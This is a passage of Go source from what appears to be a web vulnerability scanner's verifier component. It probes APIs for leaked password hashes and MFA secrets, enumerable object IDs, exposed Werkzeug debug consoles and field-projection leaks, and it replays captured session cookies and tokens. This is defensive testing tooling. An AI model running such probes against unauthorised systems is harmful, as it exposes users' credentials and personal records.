	req.Header.Set("User-Agent", userAgent)
	req.Header.Set("Accept", "application/json, text/plain, */*")
	if contentType != "" {
		req.Header.Set("Content-Type", contentType)
	}
	for k, val := range headers {
		lower := strings.ToLower(strings.TrimSpace(k))
		if lower == "" || lower == "host" || lower == "content-length" || lower == "content-type" {
			continue
		}
		req.Header.Set(k, val)
	}
	resp, err := v.client.Do(req)
	if err != nil || resp == nil {
		return types.TrafficEntry{}, false
	}
	defer resp.Body.Close()
	respBody, _ := io.ReadAll(io.LimitReader(resp.Body, 1024*1024))

	reqHeaders := make(map[string]string, len(req.Header))
	for k, vs := range req.Header {
		if len(vs) > 0 {
			reqHeaders[k] = vs[0]
		}
	}
	respHeaders := make(map[string]string, len(resp.Header))
	for k, vs := range resp.Header {
		if len(vs) > 0 {
			respHeaders[k] = vs[0]
		}
	}
	entry := types.TrafficEntry{
		Request: types.CapturedRequest{
			Method:  http.MethodPost,
			URL:     rawURL,
			Headers: reqHeaders,
			Body:    bodyBytes,
		},
		Response: types.CapturedResponse{
			StatusCode:  resp.StatusCode,
			Headers:     respHeaders,
			Body:        respBody,
			ContentType: resp.Header.Get("Content-Type"),
			Size:        int64(len(respBody)),
		},
		SourceAgent: "verifier",
		Timestamp:   time.Now(),
	}
	if id, err := v.db.InsertTraffic(v.scanID, &entry); err == nil {
		entry.ID = id
	} else {
		v.logger.Debug("failed to persist verifier traffic", "error", err, "url", rawURL)
	}
	return entry, true
}

// probeSensitiveAPIExposure is the "at least catch this" API leak pass.
// It does two generic things:
//
//  1. Review already-captured anonymous JSON responses. If the crawler saw
//     `/api/users` returning password hashes, we should not need the LLM to
//     notice it.
//  2. Actively GET a tiny list of conventional identity/account endpoints
//     under observed API prefixes (`/api`, `/api/v1`, `/rest`, ...).
//
// Confirmation is based on JSON structure, not app-specific strings: response
// fields such as passwordHash / totpSecret / apiKey / accessToken, payment
// fields, or user records combining email with role/admin metadata.
func (v *VerifierAgent) probeSensitiveAPIExposure(ctx context.Context, target string) {
	entries, _ := v.db.GetTrafficByScan(v.scanID)
	seenURLs := make(map[string]bool)
	seenObserved := make(map[string]bool)
	prefixes := observedAPIPrefixes(entries)

	for _, entry := range entries {
		if ctx.Err() != nil {
			return
		}
		if entry.Response.StatusCode < 200 || entry.Response.StatusCode >= 300 {
			continue
		}
		detection := sensitiveAPIExposureSignalDetail(entry.Response.ContentType, string(entry.Response.Body))
		if detection.Signal == "" {
			continue
		}
		// Non-GET responses often legitimately carry session tokens (for
		// example, a login endpoint returning a JWT). Treat them as findings
		// only when the response exposes credential/secret material beyond the
		// expected auth artifact itself, such as a JWT payload containing a
		// password hash or MFA secret.
		observedGraphQLRead := observedGraphQLReadResponse(entry)
		if !strings.EqualFold(entry.Request.Method, "GET") && detection.Class != apiExposureCredentialMaterial && !observedGraphQLRead {
			continue
		}
		observedKey := strings.ToUpper(entry.Request.Method) + " " + entry.Request.URL + "|" + string(detection.Class) + "|" + detection.Signal
		if seenObserved[observedKey] {
			continue
		}
		seenObserved[observedKey] = true
		seenURLs[entry.Request.URL] = true
		v.tested++
		v.confirmed++
		source := "observed anonymous traffic"
		if requestHasCredentialMaterial(entry.Request.Headers) {
			source = "observed authenticated traffic"
		}
		if observedGraphQLRead {
			source = "observed anonymous GraphQL read traffic"
			if requestHasCredentialMaterial(entry.Request.Headers) {
				source = "observed authenticated GraphQL read traffic"
			}
		}
		v.storeObservedSensitiveAPIExposureFinding(entry, detection, source)
	}
	v.probeEnumerableObjectAPIExposure(ctx, entries)

	activePaths := sensitiveAPICandidatePaths(prefixes)
	for _, path := range activePaths {
		if ctx.Err() != nil {
			return
		}
		u := target + path
		if seenURLs[u] {
			continue
		}
		resp, body, _, err := v.proactiveGET(ctx, u)
		if err == nil && resp != nil && resp.StatusCode >= 200 && resp.StatusCode < 300 {
			v.tested++
			detection := sensitiveAPIExposureSignalDetail(resp.Header.Get("Content-Type"), body)
			if detection.Signal != "" {
				v.confirmed++
				v.storeSensitiveAPIExposureFinding(u, path, resp.StatusCode,
					resp.Header.Get("Content-Type"), body, detection,
					"unauthenticated proactive API probe")
				v.db.InsertNarration(v.scanID, "verifier", "confirmed",
					fmt.Sprintf("%s returned JSON with %s — unauthenticated sensitive API exposure.",
						path, detection.Signal),
					u, nil)
				continue
			}
			v.dismissed++
		}

		authResp, authBody, _, authSource, authErr := v.proactiveGETWithObservedAuth(ctx, u)
		if authErr != nil || authResp == nil || authResp.StatusCode < 200 || authResp.StatusCode >= 300 {
			continue
		}
		v.tested++
		detection := sensitiveAPIExposureSignalDetail(authResp.Header.Get("Content-Type"), authBody)
		if detection.Signal == "" {
			v.dismissed++
			continue
		}
		v.confirmed++
		source := "authenticated proactive API probe"
		if authSource != "" {
			source += " using observed credential context from " + authSource
		}
		v.storeSensitiveAPIExposureFinding(u, path, authResp.StatusCode,
			authResp.Header.Get("Content-Type"), authBody, detection, source)
		v.db.InsertNarration(v.scanID, "verifier", "confirmed",
			fmt.Sprintf("%s returned JSON with %s when replaying the observed session.",
				path, detection.Signal),
			u, map[string]any{"auth_context_source": authSource})
	}

	v.probeFieldProjectionLeaks(ctx, entries)
	v.probeJSONPCallbackLeaks(ctx, entries)
}

func observedGraphQLReadResponse(entry types.TrafficEntry) bool {
	if !strings.Contains(strings.ToLower(entry.Request.URL), "graphql") &&
		!strings.Contains(strings.ToLower(entry.Request.Path), "graphql") {
		return false
	}
	if entry.Response.StatusCode < 200 || entry.Response.StatusCode >= 300 {
		return false
	}
	body := strings.TrimSpace(string(entry.Request.Body))
	if body == "" {
		return false
	}
	lowerBody := strings.ToLower(body)
	if strings.Contains(lowerBody, "mutation") || strings.Contains(lowerBody, "subscription") {
		return false
	}
	respPrefix := strings.ToLower(firstNRunes(strings.TrimSpace(string(entry.Response.Body)), 200))
	return strings.Contains(respPrefix, `"data"`) && !strings.Contains(respPrefix, `"__schema"`)
}

type enumerableObjectEvidence struct {
	Template        string
	Method          string
	ParamName       string
	FirstID         string
	SecondID        string
	OwnerExamples   []string
	SensitiveSignal string
	First           types.TrafficEntry
	Second          types.TrafficEntry
}

type enumerableObjectTemplate struct {
	Template  string
	ID        string
	ParamName string
}

func (v *VerifierAgent) probeEnumerableObjectAPIExposure(ctx context.Context, entries []types.TrafficEntry) {
	findings := enumerableObjectExposureFindings(entries)
	for _, finding := range findings {
		if ctx.Err() != nil {
			return
		}
		if v.db.FindingExists(v.scanID, finding.Title, finding.EndpointID) {
			continue
		}
		v.tested++
		v.confirmed++
		v.storeFinding(types.PageProfile{ID: finding.EndpointID, URL: "", Method: "GET"}, finding)
		v.db.InsertNarration(v.scanID, "verifier", "confirmed",
			fmt.Sprintf("%s exposes different owner records across enumerable object IDs.", finding.EndpointID),
			"", nil)
	}
}

func enumerableObjectExposureFindings(entries []types.TrafficEntry) []types.Finding {
	type candidate struct {
		entry     types.TrafficEntry
		object    enumerableObjectTemplate
		owners    []string
		detection apiExposureSignal
	}
	groups := make(map[string][]candidate)
	for _, entry := range entries {
		if strings.ToUpper(entry.Request.Method) != http.MethodGet {
			continue
		}
		if entry.Response.StatusCode < 200 || entry.Response.StatusCode >= 300 {
			continue
		}
		if len(entry.Response.Body) == 0 || len(entry.Response.Body) > 1024*1024 {
			continue
		}
		object, ok := numericObjectTemplate(entry)
		if !ok {
			continue
		}
		detection := sensitiveAPIExposureSignalDetail(entry.Response.ContentType, string(entry.Response.Body))
		if detection.Signal == "" ||
			(detection.Class != apiExposurePaymentData && detection.Class != apiExposurePersonalData && detection.Class != apiExposureUserAuthzData) {
			continue
		}
		owners := ownerIdentityExamplesFromJSON(entry.Response.ContentType, string(entry.Response.Body))
		if len(owners) == 0 {
			continue
		}
		key := strings.ToUpper(entry.Request.Method) + " " + object.Template
		groups[key] = append(groups[key], candidate{
			entry:     entry,
			object:    object,
			owners:    owners,
			detection: detection,
		})
	}

	var findings []types.Finding
	for _, candidates := range groups {
		if len(candidates) < 2 {
			continue
		}
		var first, second candidate
		seenOwners := make(map[string]bool)
		for _, candidate := range candidates {
			for _, owner := range candidate.owners {
				seenOwners[owner] = true
			}
			if first.entry.Request.URL == "" {
				first = candidate
				continue
			}
			if second.entry.Request.URL == "" && !sameStringSet(first.owners, candidate.owners) {
				second = candidate
			}
		}
		if second.entry.Request.URL == "" || len(seenOwners) < 2 {
			continue
		}
		evidence := enumerableObjectEvidence{
			Template:        first.object.Template,
			Method:          strings.ToUpper(first.entry.Request.Method),
			ParamName:       first.object.ParamName,
			FirstID:         first.object.ID,
			SecondID:        second.object.ID,
			OwnerExamples:   sortedStringSet(seenOwners),
			SensitiveSignal: first.detection.Signal,
			First:           first.entry,
			Second:          second.entry,
		}
		findings = append(findings, enumerableObjectExposureFinding(evidence))
	}
	sort.Slice(findings, func(i, j int) bool {
		return findings[i].EndpointID < findings[j].EndpointID
	})
	return findings
}

func enumerableObjectExposureFinding(e enumerableObjectEvidence) types.Finding {
	method := strings.ToUpper(strings.TrimSpace(e.Method))
	if method == "" {
		method = http.MethodGet
	}
	endpointID := method + " " + e.Template
	firstTarget := requestTargetFromURL(e.First.Request.URL, e.First.Request.Path)
	secondTarget := requestTargetFromURL(e.Second.Request.URL, e.Second.Request.Path)
	paramName := strings.TrimSpace(e.ParamName)
	if paramName == "" {
		paramName = "object_id"
	}
	firstID := firstNonBlank(e.FirstID, lastPathSegment(e.First.Request.Path))
	secondID := firstNonBlank(e.SecondID, lastPathSegment(e.Second.Request.Path))
	payload := fmt.Sprintf("%s values: %s -> %s", paramName, firstID, secondID)
	pocReq := fmt.Sprintf("%s\n\n%s",
		strings.TrimSpace(buildRawRequestFromEntry(e.First)),
		strings.TrimSpace(buildRawRequestFromEntry(e.Second)))
	pocResp := fmt.Sprintf("First response:\nHTTP/1.1 %d\nContent-Type: %s\n\n%s\n\nSecond response:\nHTTP/1.1 %d\nContent-Type: %s\n\n%s",
		e.First.Response.StatusCode, e.First.Response.ContentType, truncateString(string(e.First.Response.Body), 700),
		e.Second.Response.StatusCode, e.Second.Response.ContentType, truncateString(string(e.Second.Response.Body), 700))
	return types.Finding{
		Title:            fmt.Sprintf("Enumerable object API exposes cross-user records at %s", e.Template),
		Description:      fmt.Sprintf("%s %s returned sensitive JSON for multiple numeric object IDs with different owner identities (%s). This is concrete evidence of object-level authorization failure or unauthenticated object enumeration, not just a single data exposure response.", method, e.Template, strings.Join(firstNStrings(e.OwnerExamples, 4), ", ")),
		Severity:         types.SeverityHigh,
		Confidence:       types.ConfidenceConfirmed,
		EndpointID:       endpointID,
		VulnType:         "idor",
		ParamName:        paramName,
		Payload:          payload,
		PocRequest:       pocReq,
		PocResponse:      pocResp,
		StepsToReproduce: fmt.Sprintf("1. Send a %s request to %s.\n2. Change `%s` from `%s` to `%s` and send %s.\n3. Observe both responses return sensitive JSON for different owner identities: %s.", method, firstTarget, paramName, firstID, secondID, secondTarget, strings.Join(firstNStrings(e.OwnerExamples, 4), ", ")),
		Impact:           "Attackers can enumerate predictable object IDs and read other users' records. When those records contain payment, contact, or authorization data, this becomes a direct privacy and broken object-level authorization issue.",
		Remediation:      "Require authentication where appropriate and enforce object-level authorization on every object read. Derive ownership server-side from the authenticated subject and return 404/403 for objects the requester does not own.",
		Evidence: fmt.Sprintf("Template: %s\nSignal: %s\nOwner examples: %s\nExample URLs:\n- %s\n- %s",
			e.Template, e.SensitiveSignal, strings.Join(firstNStrings(e.OwnerExamples, 6), ", "), e.First.Request.URL, e.Second.Request.URL),
	}
}

func numericObjectTemplate(entry types.TrafficEntry) (enumerableObjectTemplate, bool) {
	if template, id, ok := numericPathObjectTemplate(firstNonBlank(entry.Request.Path, pathFromRawURL(entry.Request.URL))); ok {
		return enumerableObjectTemplate{Template: template, ID: id, ParamName: "path_id"}, true
	}
	if template, id, param, ok := numericQueryObjectTemplate(entry.Request.URL, entry.Request.Path, entry.Request.Query); ok {
		return enumerableObjectTemplate{Template: template, ID: id, ParamName: param}, true
	}
	return enumerableObjectTemplate{}, false
}

func numericPathObjectTemplate(path string) (string, string, bool) {
	path = strings.TrimSpace(path)
	if path == "" {
		return "", "", false
	}
	segments := strings.Split(path, "/")
	for i := len(segments) - 1; i >= 0; i-- {
		segment := strings.TrimSpace(segments[i])
		if segment == "" {
			continue
		}
		if _, err := strconv.ParseInt(segment, 10, 64); err != nil {
			continue
		}
		if strings.Trim(segment, "0123456789") != "" {
			continue
		}
		id := segment
		segments[i] = "{id}"
		return strings.Join(segments, "/"), id, true
	}
	return "", "", false
}

func numericQueryObjectTemplate(rawURL, fallbackPath, fallbackQuery string) (string, string, string, bool) {
	path := strings.TrimSpace(fallbackPath)
	rawQuery := strings.TrimPrefix(strings.TrimSpace(fallbackQuery), "?")
	if parsed, err := url.Parse(rawURL); err == nil {
		if path == "" {
			path = parsed.EscapedPath()
			if path == "" {
				path = parsed.Path
			}
		}
		if rawQuery == "" {
			rawQuery = parsed.RawQuery
		}
	}
	if path == "" || rawQuery == "" {
		return "", "", "", false
	}
	values, err := url.ParseQuery(rawQuery)
	if err != nil || len(values) == 0 {
		return "", "", "", false
	}
	type match struct {
		name  string
		id    string
		index int
	}
	var matches []match
	for name, vals := range values {
		if !queryParamLooksObjectIDParam(name) || len(vals) != 1 {
			continue
		}
		value := strings.TrimSpace(vals[0])
		if value == "" {
			continue
		}
		if _, err := strconv.ParseInt(value, 10, 64); err != nil {
			continue
		}
		if strings.Trim(value, "0123456789") != "" {
			continue
		}
		matches = append(matches, match{name: name, id: value, index: 0})
	}
	if len(matches) != 1 {
		return "", "", "", false
	}
	selected := matches[0]
	return path + "?" + encodeQueryTemplate(values, selected.name, selected.index), selected.id, selected.name, true
}

func queryParamLooksObjectIDParam(name string) bool {
	norm := strings.ToLower(strings.TrimSpace(name))
	if norm == "" {
		return false
	}
	compact := strings.NewReplacer("_", "", "-", "", ".", "").Replace(norm)
	switch compact {
	case "page", "p", "offset", "limit", "perpage", "pagesize", "size", "count", "cursor", "next", "previous", "sort", "order", "q", "query", "search":
		return false
	case "id", "uuid", "guid":
		return true
	}
	return strings.HasSuffix(compact, "id") ||
		strings.Contains(compact, "objectid") ||
		strings.Contains(compact, "recordid") ||
		strings.Contains(compact, "reportid") ||
		strings.Contains(compact, "orderid") ||
		strings.Contains(compact, "userid") ||
		strings.Contains(compact, "accountid") ||
		strings.Contains(compact, "customerid")
}

func encodeQueryTemplate(values url.Values, templateName string, templateIndex int) string {
	keys := make([]string, 0, len(values))
	for key := range values {
		keys = append(keys, key)
	}
	sort.Strings(keys)
	var parts []string
	for _, key := range keys {
		vals := append([]string(nil), values[key]...)
		sort.Strings(vals)
		for i, value := range vals {
			encodedValue := url.QueryEscape(value)
			if key == templateName && i == templateIndex {
				encodedValue = "{id}"
			}
			parts = append(parts, url.QueryEscape(key)+"="+encodedValue)
		}
	}
	return strings.Join(parts, "&")
}

func pathFromRawURL(rawURL string) string {
	parsed, err := url.Parse(rawURL)
	if err != nil {
		return ""
	}
	if escaped := parsed.EscapedPath(); escaped != "" {
		return escaped
	}
	return parsed.Path
}

func ownerIdentityExamplesFromJSON(contentType, body string) []string {
	trimmed := strings.TrimSpace(body)
	if trimmed == "" || len(trimmed) > 1024*1024 {
		return nil
	}
	lowerCT := strings.ToLower(contentType)
	if !strings.Contains(lowerCT, "json") && !strings.HasPrefix(trimmed, "{") && !strings.HasPrefix(trimmed, "[") {
		return nil
	}
	var parsed any
	if err := json.Unmarshal([]byte(trimmed), &parsed); err != nil {
		return nil
	}
	seen := make(map[string]bool)
	collectOwnerIdentityExamples(parsed, seen)
	return sortedStringSet(seen)
}

func collectOwnerIdentityExamples(value any, seen map[string]bool) {
	switch typed := value.(type) {
	case map[string]any:
		for key, child := range typed {
			norm := normalizeJSONKey(key)
			switch {
			case norm == "email" && jsonValueLooksEmail(child):
				seen[strings.ToLower(fmt.Sprint(child))] = true
			case (norm == "username" || norm == "user" || norm == "userid" || norm == "owner" || norm == "ownerid") && meaningfulJSONValue(child):
				seen[norm+"="+fmt.Sprint(child)] = true
			}
			collectOwnerIdentityExamples(child, seen)
		}
	case []any:
		for _, child := range typed {
			collectOwnerIdentityExamples(child, seen)
		}
	}
}

func sortedStringSet(seen map[string]bool) []string {
	out := make([]string, 0, len(seen))
	for value := range seen {
		out = append(out, value)
	}
	sort.Strings(out)
	return out
}

func sameStringSet(a, b []string) bool {
	if len(a) != len(b) {
		return false
	}
	seen := make(map[string]int, len(a))
	for _, value := range a {
		seen[value]++
	}
	for _, value := range b {
		if seen[value] == 0 {
			return false
		}
		seen[value]--
	}
	return true
}

func lastPathSegment(path string) string {
	path = strings.TrimRight(path, "/")
	if idx := strings.LastIndex(path, "/"); idx >= 0 {
		return path[idx+1:]
	}
	return path
}

func requestTargetFromURL(rawURL, fallbackPath string) string {
	if parsed, err := url.Parse(rawURL); err == nil && parsed.RequestURI() != "" {
		return parsed.RequestURI()
	}
	if strings.TrimSpace(fallbackPath) != "" {
		return fallbackPath
	}
	return rawURL
}

type debugConsoleSignal struct {
	Framework string
	Detail    string
	Locked    bool
}

func (v *VerifierAgent) probeDebugConsoles(ctx context.Context, probeBase string) {
	probeBase = strings.TrimRight(probeBase, "/")
	if probeBase == "" {
		return
	}
	paths := []string{
		"/console",
		"/__debugger__",
		"/_debug_toolbar/",
		"/debug/console",
	}
	seen := make(map[string]struct{}, len(paths))
	for _, path := range paths {
		if ctx.Err() != nil {
			return
		}
		if _, ok := seen[path]; ok {
			continue
		}
		seen[path] = struct{}{}
		u := probeBase + path
		resp, body, _, err := v.proactiveGET(ctx, u)
		if err != nil || resp == nil {
			continue
		}
		if resp.StatusCode < 200 || resp.StatusCode >= 300 {
			continue
		}
		v.tested++
		signal, ok := exposedDebugConsoleSignal(resp.Header.Get("Server"), body)
		if !ok {
			v.dismissed++
			continue
		}
		v.confirmed++
		v.storeDebugConsoleFinding(u, path, resp.StatusCode, resp.Header.Get("Content-Type"), body, signal)
		v.db.InsertNarration(v.scanID, "verifier", "confirmed",
			fmt.Sprintf("%s exposes %s debugger markers (%s).", path, signal.Framework, signal.Detail),
			u, nil)
	}
}

func exposedDebugConsoleSignal(serverHeader, body string) (debugConsoleSignal, bool) {
	trimmed := strings.TrimSpace(body)
	if trimmed == "" {
		return debugConsoleSignal{}, false
	}
	lower := strings.ToLower(firstNRunes(trimmed, 8000))
	lowerServer := strings.ToLower(serverHeader)
	if (strings.Contains(lower, "werkzeug debugger") ||
		strings.Contains(lower, "console // werkzeug") ||
		strings.Contains(lowerServer, "werkzeug")) &&
		strings.Contains(lower, "console_mode") &&
		strings.Contains(lower, "evalex") &&
		(strings.Contains(lower, "interactive console") || strings.Contains(lower, "execute python expressions")) {
		locked := strings.Contains(lower, "console locked") ||
			strings.Contains(lower, "needs to be unlocked") ||
			strings.Contains(lower, "pin:")
		detail := "interactive Python console is reachable"
		if locked {
			detail = "interactive Python console is reachable but PIN-locked"
		}
		return debugConsoleSignal{Framework: "Werkzeug", Detail: detail, Locked: locked}, true
	}
	return debugConsoleSignal{}, false
}

func (v *VerifierAgent) storeDebugConsoleFinding(rawURL, path string, status int, contentType, body string, signal debugConsoleSignal) {
	requestTarget := path
	if parsed, err := url.Parse(rawURL); err == nil && parsed.RequestURI() != "" {
		requestTarget = parsed.RequestURI()
	}
	severity := types.SeverityHigh
	impact := "A framework interactive debugger is reachable over HTTP. Even when PIN-locked, this exposes a dangerous execution surface and framework internals; if the PIN is leaked, guessed, or derived from host metadata, attackers can execute server-side code."
	if !signal.Locked {
		severity = types.SeverityCritical
		impact = "A framework interactive debugger is reachable without a visible lock, exposing a direct server-side code execution surface."
	}
	v.storeFinding(types.PageProfile{ID: "GET " + path, URL: rawURL, Method: "GET"}, types.Finding{
		Title:       fmt.Sprintf("%s debugger console exposed at %s", signal.Framework, path),
		Description: fmt.Sprintf("GET %s returned a %s debugger console page: %s. AOBTD did not attempt to bypass or brute-force any debugger PIN.", path, signal.Framework, signal.Detail),
		Severity:    severity,
		Confidence:  types.ConfidenceConfirmed,
		EndpointID:  "GET " + path,
		VulnType:    "debug_console_exposure",
		Payload:     "(no payload — direct GET)",
		PocRequest:  buildPlaceholderHTTPRequest("GET", rawURL, ""),
		PocResponse: fmt.Sprintf("HTTP/1.1 %d\nContent-Type: %s\n\n%s", status, contentType, truncateString(body, 900)),
		StepsToReproduce: fmt.Sprintf("1. Send an unauthenticated GET to %s.\n2. Observe the %s debugger console page. %s.\n3. Do not attempt PIN bypass/brute force during remediation retest; verify the endpoint is no longer reachable in production.",
			requestTarget, signal.Framework, signal.Detail),
		Impact:      impact,
		Remediation: "Disable framework debug mode and interactive debugger consoles in all non-local environments. Bind debug tools to localhost only, require strong admin authentication for diagnostic surfaces, and redeploy with production server settings.",
		Evidence: fmt.Sprintf("URL: %s\nStatus: %d\nContent-Type: %s\nFramework: %s\nSignal: %s\nLocked: %t",
			rawURL, status, contentType, signal.Framework, signal.Detail, signal.Locked),
	})
}

func (v *VerifierAgent) storeObservedSensitiveAPIExposureFinding(entry types.TrafficEntry, detection apiExposureSignal, source string) {
	method := strings.ToUpper(strings.TrimSpace(entry.Request.Method))
	if method == "" {
		method = "GET"
	}
	rawURL := entry.Request.URL
	path := entry.Request.Path
	requestTarget := path
	if parsed, err := url.Parse(rawURL); err == nil {
		if parsed.Path != "" {
			path = parsed.Path
		}
		if parsed.RequestURI() != "" {
			requestTarget = parsed.RequestURI()
		}
	}
	if path == "" {
		path = "/"
	}
	if requestTarget == "" {
		requestTarget = path
	}
	title := fmt.Sprintf("Sensitive API data exposure at %s", path)
	vulnType := "api_data_exposure"
	impact := "Clients can retrieve user/account metadata or other sensitive structured data from this API response. " +
		"Attackers commonly pivot from this into account targeting, privacy violations, or authorization testing."
	remediation := "Return only the fields required by the current user and use response DTOs / allowlists. " +
		"Enforce authentication and object/role-level authorization before returning user/account records or request metadata."
	if strings.Contains(strings.ToLower(path), "graphql") {
		title = fmt.Sprintf("Sensitive GraphQL data exposure at %s", path)
		vulnType = "graphql_data_exposure"
	}
	if detection.Class == apiExposureCredentialMaterial {
		title = fmt.Sprintf("Credential material exposed by API at %s", path)
		vulnType = "credential_material_exposure"
		impact = "The response exposes credential-grade material such as password/hash fields, MFA secrets, or secret-bearing JWT claims. " +
			"Attackers can crack hashes offline, target privileged accounts, or reuse leaked material in follow-on attacks."
		remediation = "Do not serialize password hashes, MFA seeds, reset secrets, or secret-bearing token claims into client-facing responses. " +
			"Use explicit response DTOs / allowlists for public account fields."
	}
	pocReq := buildPlaceholderHTTPRequest(method, rawURL, truncateString(string(entry.Request.Body), 1200))
	if method == "POST" {
		contentType := capturedHeaderValue(entry.Request.Headers, "Content-Type")
		if contentType == "" {
			contentType = "application/json"
		}
		pocReq = buildRawPOSTRequest(rawURL, contentType, entry.Request.Body, reproducibleRequestHeaders(entry.Request.Headers))
	}
	stepAuth := "Send the observed request"
	if strings.Contains(strings.ToLower(source), "unauth") || strings.Contains(strings.ToLower(source), "anonymous") {
		stepAuth = "Send the request without an authenticated session"
	} else if strings.Contains(strings.ToLower(source), "auth") {
		stepAuth = "Send the request using a normal user session"
	}
	v.storeFinding(types.PageProfile{ID: method + " " + path, URL: rawURL, Method: method}, types.Finding{
		Title:            title,
		Description:      fmt.Sprintf("%s %s returned JSON containing %s. This was identified from %s.", method, path, detection.Signal, source),
		Severity:         detection.Severity,
		Confidence:       types.ConfidenceConfirmed,
		EndpointID:       method + " " + path,
		VulnType:         vulnType,
		Payload:          truncateString(string(entry.Request.Body), 500),
		PocRequest:       pocReq,
		PocResponse:      fmt.Sprintf("HTTP/1.1 %d\nContent-Type: %s\n\n%s", entry.Response.StatusCode, entry.Response.ContentType, truncateString(string(entry.Response.Body), 900)),
		StepsToReproduce: fmt.Sprintf("1. %s to %s.\n2. Observe the JSON response contains %s.", stepAuth, requestTarget, detection.Signal),
		Impact:           impact,
		Remediation:      remediation,
		Evidence: fmt.Sprintf("URL: %s\nHTTP: %s %d\nContent-Type: %s\nSignal: %s\nBody preview: %s",
			rawURL, method, entry.Response.StatusCode, entry.Response.ContentType, detection.Signal, truncateString(string(entry.Response.Body), 600)),
	})
}

func capturedHeaderValue(headers map[string]string, name string) string {
	want := strings.ToLower(strings.TrimSpace(name))
	for key, value := range headers {
		if strings.ToLower(strings.TrimSpace(key)) == want {
			return strings.TrimSpace(value)
		}
	}
	return ""
}

func reproducibleRequestHeaders(headers map[string]string) map[string]string {
	if len(headers) == 0 {
		return nil
	}
	out := make(map[string]string)
	for key, value := range headers {
		lower := strings.ToLower(strings.TrimSpace(key))
		switch lower {
		case "authorization", "x-api-key", "x-auth-token", "x-access-token", "cookie":
			if strings.TrimSpace(value) != "" {
				out[key] = value
			}
		}
	}
	if len(out) == 0 {
		return nil
	}
	return out
}

func (v *VerifierAgent) storeSensitiveAPIExposureFinding(rawURL, path string, status int,
	contentType, body string, detection apiExposureSignal, source string,
) {
	requestTarget := path
	if parsed, err := url.Parse(rawURL); err == nil {
		if parsed.Path != "" {
			path = parsed.Path
		}
		if parsed.RequestURI() != "" {
			requestTarget = parsed.RequestURI()
		}
	}
	if path == "" {
		path = "/"
	}
	if requestTarget == "" {
		requestTarget = path
	}
	stepAuth := "Send a GET"
	if strings.Contains(strings.ToLower(source), "unauth") || strings.Contains(strings.ToLower(source), "anonymous") {
		stepAuth = "Send an unauthenticated GET"
	} else if strings.Contains(strings.ToLower(source), "auth") {
		stepAuth = "Send an authenticated GET using a normal user session"
	}
	profile := types.PageProfile{ID: "GET " + path, URL: rawURL, Method: "GET"}
	title := fmt.Sprintf("Sensitive API data exposure at %s", path)
	vulnType := "api_data_exposure"
	impact := "Anonymous clients can enumerate user/account metadata or recover credential-related material. " +
		"Attackers commonly pivot from this into account takeover, role targeting, password cracking, or MFA bypass."
	remediation := "Require authentication and object/role-level authorization before returning user/account records. " +
		"Never return password hashes, MFA seeds, tokens, or secret material in client-facing API responses."
	if detection.Class == apiExposureCredentialMaterial {
		title = fmt.Sprintf("Credential material exposed by API at %s", path)
		vulnType = "credential_material_exposure"
		impact = "The response exposes credential-grade material such as password/hash fields, MFA secrets, or secret-bearing JWT claims. " +
			"Attackers can crack hashes offline, target privileged accounts, or reuse leaked material in follow-on attacks."
		remediation = "Do not serialize password hashes, MFA seeds, reset secrets, or secret-bearing token claims into client-facing responses. " +
			"Use explicit response DTOs / allowlists for public account fields."
	}
	v.storeFinding(profile, types.Finding{
		Title: title,
		Description: fmt.Sprintf(
			"GET %s returned JSON containing %s. This was identified from %s.",
			path, detection.Signal, source),
		Severity:         detection.Severity,
		Confidence:       types.ConfidenceConfirmed,
		EndpointID:       "GET " + path,
		VulnType:         vulnType,
		Payload:          "(no payload — direct GET)",
		PocRequest:       buildPlaceholderHTTPRequest("GET", rawURL, ""),
		PocResponse:      fmt.Sprintf("HTTP/1.1 %d\nContent-Type: %s\n\n%s", status, contentType, truncateString(body, 800)),
		StepsToReproduce: fmt.Sprintf("1. %s to %s.\n2. Observe the JSON response contains %s.", stepAuth, requestTarget, detection.Signal),
		Impact:           impact,
		Remediation:      remediation,
		Evidence: fmt.Sprintf("URL: %s\nStatus: %d\nContent-Type: %s\nSignal: %s\nBody preview: %s",
			rawURL, status, contentType, detection.Signal, truncateString(body, 500)),
	})
}

type projectionProbeTarget struct {
	BaseURL string
	Path    string
	Source  string
}

type projectionAuthAttempt struct {
	Headers map[string]string
	Source  string
}

// probeFieldProjectionLeaks models a common human recon move: after seeing a
// "current user", "profile", "account", or already-projected JSON endpoint,
// ask whether the API lets clients choose hidden fields via parameters such as
// fields/select/include. This is deliberately generic and only confirms when
// the projected response exposes credential-grade material.
func (v *VerifierAgent) probeFieldProjectionLeaks(ctx context.Context, entries []types.TrafficEntry) {
	targets := projectionProbeTargets(entries)
	if len(targets) == 0 {
		return
	}
	paramNames := []string{"fields", "select", "include", "projection", "columns"}
	fieldSet := "id,email,username,role,roles,isAdmin,password,passwordHash,password_hash,passwordDigest,hash,totpSecret,mfaSecret,otpSecret,secret"
	checked := 0
	const maxProjectionChecks = 80

	for _, target := range targets {
		if ctx.Err() != nil || checked >= maxProjectionChecks {
			return
		}
		baseHeaders, authSource := v.credentialHeadersForURL(target.BaseURL)
		if len(baseHeaders) == 0 {
			continue
		}
		authAttempts := projectionAuthAttempts(baseHeaders, authSource)
		if len(authAttempts) == 0 {
			continue
		}
		preferredParams := projectionParamOrder(target.BaseURL, paramNames)
		for _, paramName := range preferredParams {
			for _, attempt := range authAttempts {
				if ctx.Err() != nil || checked >= maxProjectionChecks {
					return
				}
				u := projectionURLWithFields(target.BaseURL, paramName, fieldSet)
				if u == "" {
					continue
				}
				checked++
				resp, body, _, err := v.proactiveGETWithHeaders(ctx, u, attempt.Headers,
					"AOBTD/Verifier (field projection probe)")
				if err != nil || resp == nil {
					continue
				}
				if resp.StatusCode < 200 || resp.StatusCode >= 300 {
					v.tested++
					v.dismissed++
					continue
				}
				v.tested++
				detection := sensitiveAPIExposureSignalDetail(resp.Header.Get("Content-Type"), body)
				if detection.Class != apiExposureCredentialMaterial {
					v.dismissed++
					continue
				}
				v.confirmed++
				source := fmt.Sprintf("authenticated field projection probe using %q on %s", paramName, target.Source)
				if attempt.Source != "" {
					source += " with credential context from " + attempt.Source
				}
				v.storeSensitiveAPIExposureFinding(u, target.Path, resp.StatusCode,
					resp.Header.Get("Content-Type"), body, detection, source)
				v.db.InsertNarration(v.scanID, "verifier", "confirmed",
					fmt.Sprintf("Field projection on %s exposed %s.", target.Path, detection.Signal),
					u, map[string]any{"projection_param": paramName, "auth_source": attempt.Source})
				break
			}
		}
	}
}

func projectionProbeTargets(entries []types.TrafficEntry) []projectionProbeTarget {
	seen := make(map[string]bool)
	var out []projectionProbeTarget
	for _, entry := range entries {
